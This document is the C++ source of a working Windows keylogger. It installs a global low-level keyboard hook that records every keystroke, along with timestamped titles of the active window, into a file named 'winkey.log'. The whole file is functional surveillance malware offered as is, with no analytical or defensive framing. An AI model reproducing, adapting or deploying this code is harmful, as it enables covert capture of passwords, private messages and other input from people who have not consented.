#pragma warning(disable:4530 4668 4577 5045)

#include <windows.h>
#include <string.h>
#include <string>
#include <stdio.h>

#pragma comment(lib, "user32.lib")

TCHAR wnd_title[1024] = { 0 };
TCHAR old_wnd_title[1024] = { 0 };

std::string map_keys[255] = { 
	"", "LEFT_MOUSE", "RIGHT_MOUSE", "Control-Break", "MIDDLE_MOUSE", "X1_MOUSE", "X2_MOUSE",
	"", "BACKSPACE", "TAB", "", "", "CLEAR", "--", "", "", "SHIFT", "CTRL", "ALT", "PAUSE",
	"CAPS", "", "", "", "", "", "", "ESC", "", "", "", "", "--", "PAGE_UP", "PAGE_DOWN",
	"END", "HOME", "LEFT_ARROW", "UP_ARROW", "RIGHT_ARROW", "DOWN_ARROW", "SELECT", "PRINT", "EXECUTE", "PRINT_SCREEN",
	"INSERT", "DE", "HELP", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "", "", "", "", "", "", "",
	"--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--",
	"--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "LEFT_WND", "RIGHT_WND",
	"APPLICATIONS", "", "SLEEP", "KEYPAD_0", "KEYPAD_1", "KEYPAD_2", "KEYPAD_3", "KEYPAD_4", "KEYPAD_5", "KEYPAD_6",
	"KEYPAD_7", "KEYPAD_8", "KEYPAD_9", "--", "--", "--", "--", "--", "--",
	"F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12", "F13", "F14", "F15", "F16", "F17",
	"F18", "F19", "F20", "F21", "F22", "F23", "F24", "", "", "", "", "", "", "", "", "NUM_LOCK", "SCROLL_LOCK",
	"", "", "", "", "", "", "", "", "", "", "", "", "", "", "LEFT_SHIFT", "RIGHT_SHIFT", "LEFT_CTRL", "RIGHT_CTRL",
	"LEFT_MENU", "RIGHT_MENU", "BROWSER_BACK", "BROWSER_FORWARD", "BROWSER_REFRESH", "BROWSER_STOP", "BROWSER_SEARCH",
	"BROWSER_FAVORITES", "HOME", "VOLUME_MUTE", "VOLUME_DOWN", "VOLUME_UP", "NEXT_TRACK", "PREV_TRACK", "STOP_MEDIA",
	"PLAY_PAUSE", "START_MAI", "SELECT_MEDIA", "START_APP_1", "START_APP_2", "", "", "--", "--", "--", "--", "--",
	"--", "--", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "",
	"", "", "", "--", "--", "--", "--", "--", "", "", "--", "", "", "", "", "", "", "", "", "", "", "", "",
	"", "", "", "", "", "", "", "ATTN", "CrSe", "ExSe", "ERASE", "PLAY", "ZOOM", "", "PA1", "CLEAR"
};

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT* kbd_struct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
	HANDLE hFile;
	DWORD dwPtr, dwPID, dwThreadID;
	int numChars;

	switch (wParam) {
	case WM_SYSKEYDOWN:
	case WM_KEYDOWN:
		HWND hForegroundProcess = GetForegroundWindow();
		dwThreadID = GetWindowThreadProcessId(hForegroundProcess, &dwPID);
		HKL currentLocale = GetKeyboardLayout(dwThreadID);
		WCHAR buffer[32];
		TCHAR log_title[1500];
		BYTE uKeyboardState[256] = { 0 };
		SYSTEMTIME local_time;

		hFile = CreateFile(
			TEXT("winkey.log"),
			FILE_APPEND_DATA,
			FILE_SHARE_READ,
			NULL,
			OPEN_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL);

		if (hFile != INVALID_HANDLE_VALUE) {
			SetFilePointer(hFile, 0, NULL, FILE_END);
			GetWindowTextA(hForegroundProcess, wnd_title, 1024);
			if (strcmp(old_wnd_title, wnd_title) != 0) {
				GetLocalTime(&local_time);
				_snprintf_s(log_title, 1500, 1500, "\r\n[%02d.%02d.%04d %02d:%02d:%02d] - '%s'\r\n", local_time.wDay, local_time.wMonth, local_time.wYear, local_time.wHour, local_time.wMinute, local_time.wSecond, wnd_title);
				strcpy_s(old_wnd_title, _countof(wnd_title), wnd_title);
				WriteFile(
					hFile,
					log_title,
					strlen(log_title),
					&dwPtr,
					NULL);
			}
			char key[32] = { 0 };
			if (strcmp(map_keys[kbd_struct->vkCode].c_str(), "--") != 0 &&
				strcmp(map_keys[kbd_struct->vkCode].c_str(), "") != 0) {
				_snprintf_s(key, 32, 32, "[%s]", map_keys[kbd_struct->vkCode].c_str());
				WriteFile(
					hFile,
					key,
					strlen(key),
					&dwPtr,
					NULL);
			} else {
				GetKeyState(VK_SHIFT);
				GetKeyState(VK_MENU);
				GetKeyboardState(uKeyboardState);
				numChars = ToUnicodeEx(kbd_struct->vkCode, kbd_struct->scanCode, uKeyboardState, buffer, 32, 0, currentLocale);
				if (numChars >= 1) {
					WriteFile(
						hFile,
						buffer,
						(DWORD)numChars,
						&dwPtr,
						NULL);
				}
			}

			CloseHandle(hFile);
			hFile = INVALID_HANDLE_VALUE;
		}
		break;
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd)
{
	(void)hInstance;
	(void)hPrevInstance;
	(void)lpCmdLine;
	(void)nShowCmd;

	HHOOK kbd = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyboardHook, 0, 0);

	MSG message;
	while (GetMessage(&message, NULL, NULL, NULL) > 0) {
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	UnhookWindowsHookEx(kbd);

	return 0;
}